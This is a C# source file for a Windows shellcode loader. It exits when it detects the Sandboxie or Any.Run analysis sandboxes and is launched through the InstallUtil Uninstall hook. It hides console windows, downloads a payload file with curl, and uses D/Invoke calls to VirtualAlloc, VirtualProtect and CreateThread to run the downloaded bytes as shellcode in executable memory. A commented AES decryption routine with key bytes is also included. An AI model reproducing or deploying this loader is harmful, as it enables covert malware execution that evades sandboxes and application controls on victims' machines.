using ConsoleApp2;
using DInvoke_Code;
using System;
using System.Collections;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Runtime.InteropServices;
using System.Security.Cryptography;

namespace mm
{
    class Program
    {
        [DllImport("kernel32.dll")]
        public static extern IntPtr GetModuleHandle(string lpModuleName);
        static void Main(string[] args)
        {
            if (GetModuleHandle("SbieDll.dll").ToInt32() != 0)
            {
                Environment.Exit(0);
            }
            Process[] kill = Process.GetProcessesByName("SbieCtrl");
            foreach (Process SbieCtrl in kill)
            {
                Environment.Exit(0);
            }
            const string anyrunmac = "52:54:00:4A:04:AF";
            ArrayList ary = new ArrayList();//Anyrun Sandbox mac addresses
            ManagementClass manager = new ManagementClass("Win32_NetworkAdapterConfiguration");
            foreach (ManagementObject obj in manager.GetInstances())
            {
                if ((bool)obj["IPEnabled"])
                {
                    ary.Add(obj["MacAddress"].ToString());//We throw mac addresses into the array.
                }
            }

            //Check
            for (int i = 0; i < ary.Count; i++)
            {
                if (anyrunmac != ary[0].ToString())
                {
                    if (i == ary.Count - 1)
                    {
                        Console.Write(ary[0].ToString() + ": Mac Address Not Found.");
                        Console.ReadKey();
                    }
                }
                else
                {
                    break;
                }
            }
        }
    }
    [System.ComponentModel.RunInstaller(true)]
    public class Sample : System.Configuration.Install.Installer
    {
        [DllImport("user32.dll", EntryPoint = "ShowWindow", SetLastError = true)]
        static extern bool ShowWindow(IntPtr hWnd, uint nCmdShow);
        [DllImport("user32.dll", EntryPoint = "FindWindow", SetLastError = true)]
        public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
        //The Methods can be Uninstall/Install.  Install is transactional, and really unnecessary.
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            //Mutex
            bool flag = false;
            System.Threading.Mutex mutex = new System.Threading.Mutex(true, "wkkxo34x", out flag);
            if (flag)
            {
                IntPtr a = FindWindow("ConsoleWindowClass", "taskeng.exe");
                IntPtr b = FindWindow("ConsoleWindowClass", "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\InstallUtil.exe");
                IntPtr c = FindWindow("ConsoleWindowClass", "C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\InstallUtil.exe");
                if (a != IntPtr.Zero)
                    ShowWindow(a, 0);

                if (b != IntPtr.Zero)
                    ShowWindow(b, 0);

                if (c != IntPtr.Zero)
                    ShowWindow(c, 0);

                //在这里加自启动代码

                Shellcode.Exec();
                System.Threading.Thread.Sleep(86400000);
            }
            else
            {
                Environment.Exit(0);
            }


        }

    }
    public class Shellcode
    {
        public static void Exec()
        {
            string ApplicationData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            string indexpath = "C:\\intel\\w32.bin";
            if (File.Exists(indexpath))
            {
            }
            else
            {
                CMD.CMDOperator("cmd.exe", @"curl.exe -l http://127.0.0.1/index.dat -o c:\intel\index.dat");
            }
            //byte[] shellcode2 = File.ReadAllBytes("C:\\intel\\index.dat");
            //byte[] passwordBytes = new byte[] { 66, 138, 122, 208, 171, 145, 92, 127, 70, 159, 106, 57, 170, 164, 232, 83, 225, 120, 193, 164, 191, 10, 83, 226, 73, 24, 82, 104, 12, 47, 93, 35, };
            //byte[] saltBytes = new byte[] { 65, 13, 55, 215, 72, 26, 253, 13, 123, 142, 170, 178, 125, 182, 6, 219, 17, 67, 101, 66, 219, 84, 125, 136, 181, 18, 61, 58, 15, 62, 202, 17, };
            byte[] shellcode = File.ReadAllBytes("C:\\intel\\index.dat");

            IntPtr func_ptr = IntPtr.Zero;
            IntPtr pHandle = Process.GetCurrentProcess().Handle;

            Process e=Process.GetCurrentProcess();
            func_ptr = DInvokeFunctions.GetLibraryAddress("kernel32.dll", "VirtualAlloc");
            DELEGATES.VirtualAllocRx VirtualAllocRx = Marshal.GetDelegateForFunctionPointer(func_ptr, typeof(DELEGATES.VirtualAllocRx)) as DELEGATES.VirtualAllocRx;
            IntPtr rMemAddress = VirtualAllocRx(0, (uint)shellcode.Length, 0x1000 | 0x2000, 0x04);
            Marshal.Copy(shellcode, 0, (IntPtr)(rMemAddress), shellcode.Length);

            e=Process.GetCurrentProcess();
            uint    outpro;
            func_ptr = DInvokeFunctions.GetLibraryAddress("kernel32.dll", "VirtualProtect");
            DELEGATES.VirtualProtectRx VirtualProtectRx = Marshal.GetDelegateForFunctionPointer(func_ptr, typeof(DELEGATES.VirtualProtectRx)) as DELEGATES.VirtualProtectRx;
            VirtualProtectRx((uint)rMemAddress, (uint)shellcode.Length, (uint)MemoryProtection.PAGE_EXECUTE_READWRITE, out outpro);
            
            IntPtr hThread = IntPtr.Zero;
            UInt32 threadId = 0;
            // prepare data
            IntPtr pinfo = IntPtr.Zero;
            string s="";
            for (int i = 0; i < 40; i++)
            {
                s=s+"a";
            }
            Process.GetCurrentProcess();
            // execute native code
            func_ptr = DInvokeFunctions.GetLibraryAddress("kernel32.dll", "CreateThread");
            DELEGATES.CreateThreadRx CreateThreadRx = Marshal.GetDelegateForFunctionPointer(func_ptr, typeof(DELEGATES.CreateThreadRx)) as DELEGATES.CreateThreadRx;
            hThread = CreateThreadRx(0, 0, rMemAddress, pinfo, 0, ref threadId);
            func_ptr = DInvokeFunctions.GetLibraryAddress("kernel32.dll", "WaitForSingleObject");
            DELEGATES.WaitForSingleObjectRx WaitForSingleObjectRx = Marshal.GetDelegateForFunctionPointer(func_ptr, typeof(DELEGATES.WaitForSingleObjectRx)) as DELEGATES.WaitForSingleObjectRx;
            WaitForSingleObjectRx(hThread, 0xFFFFFFFF);
        }
        public enum MemoryProtection
        {
            PAGE_EXECUTE_READWRITE = 0x0040,
            PAGE_READWRITE = 0x04
        }
        private static UInt32 MEM_COMMIT = 0x1000;
        static byte[] DecryptShellcode(byte[] passwordBytes, byte[] saltBytes, byte[] shellcode)
        {
            byte[] decryptedString;

            RijndaelManaged rj = new RijndaelManaged();

            try
            {
                rj.KeySize = 256;
                rj.BlockSize = 128;
                var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
                rj.Key = key.GetBytes(rj.KeySize / 8);
                rj.IV = key.GetBytes(rj.BlockSize / 8);
                rj.Mode = CipherMode.CBC;

                MemoryStream ms = new MemoryStream(shellcode);

                using (CryptoStream cs = new CryptoStream(ms, rj.CreateDecryptor(), CryptoStreamMode.Read))
                {
                    cs.Read(shellcode, 0, shellcode.Length);
                    decryptedString = ms.ToArray();
                }
            }
            finally
            {
                rj.Clear();
            }

            return decryptedString;
        }
    }
}
